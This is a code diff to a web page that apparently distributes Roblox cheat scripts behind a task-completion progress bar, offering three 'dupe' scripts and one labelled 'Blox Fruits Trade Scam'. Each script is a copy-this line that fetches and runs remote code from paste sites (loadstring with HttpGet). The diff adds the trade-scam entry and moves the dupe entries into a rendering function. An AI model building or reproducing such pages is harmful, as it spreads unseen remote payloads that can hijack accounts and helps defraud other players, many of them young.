@@ -82,8 +82,15 @@ body {
 }
 
 .scripts, .dev-panel {
-  display: none;
   margin-top: 20px;
+}
+
+.scripts {
+  display: none;
+}
+
+.dev-panel {
+  display: none;
 }
 
 .script-box {
@@ -161,26 +168,8 @@ textarea {
 
   <button class="task dev-btn" onclick="openDev()">Show All Scripts (Dev)</button>
 
-  <!-- UNLOCKED DUPE SCRIPTS -->
-  <div class="scripts" id="scripts">
-    <div class="script-box">
-      <div class="script-title">Dupe Script 1</div>
-      <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
-      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
-    </div>
-
-    <div class="script-box">
-      <div class="script-title">Dupe Script 2</div>
-      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
-      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
-    </div>
-
-    <div class="script-box">
-      <div class="script-title">Dupe Script 3</div>
-      <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
-      <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
-    </div>
-  </div>
+  <!-- UNLOCKED SCRIPTS -->
+  <div class="scripts" id="scripts"></div>
 
   <!-- DEV PANEL (ALL 4 SCRIPTS) -->
   <div class="dev-panel" id="devPanel">
@@ -241,7 +230,10 @@ function update() {
   let percent = Math.floor((done / total) * 100);
   bar.style.width = percent + "%";
   percentEl.innerText = percent + "%";
-  if (percent === 100) scripts.style.display = "block";
+  if (percent === 100) {
+    scripts.style.display = "block";
+    updateScriptsVisibility();
+  }
 }
 
 function togglePage() {
@@ -256,6 +248,7 @@ function togglePage() {
     toggleBtn.innerText = "Blox Fruits Trade Scam";
     ytLink = "https://youtu.be/Oc9vLLmABqs";
   }
+  updateScriptsVisibility();
 }
 
 function resetProgress() {
@@ -267,6 +260,38 @@ function resetProgress() {
     delete b.dataset.done;
     b.style.opacity = 1;
   });
+}
+
+function updateScriptsVisibility() {
+  if (tradePage) {
+    // Trade Scam page: show only trade scam script
+    scripts.innerHTML = `
+      <div class="script-box">
+        <div class="script-title">Blox Fruits Trade Scam</div>
+        <textarea readonly>loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xU2oTZng4Oga2rmU/raw", true))()</textarea>
+        <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
+      </div>`;
+  } else {
+    // Brainrot dupe page: show the 3 dupe scripts
+    scripts.innerHTML = `
+      <div class="script-box">
+        <div class="script-title">Dupe Script 1</div>
+        <textarea readonly>loadstring(game:HttpGet("https://dpaste.com/ELB5KB66F.txt", true))()</textarea>
+        <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
+      </div>
+
+      <div class="script-box">
+        <div class="script-title">Dupe Script 2</div>
+        <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/qLQ25me5/raw"))()</textarea>
+        <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
+      </div>
+
+      <div class="script-box">
+        <div class="script-title">Dupe Script 3</div>
+        <textarea readonly>loadstring(game:HttpGet("https://pastefy.app/cX73Mb9d/raw"))()</textarea>
+        <button class="copy" onclick="copyWithConfirm(this.previousElementSibling.value)">Copy</button>
+      </div>`;
+  }
 }
 
 function openDev() {
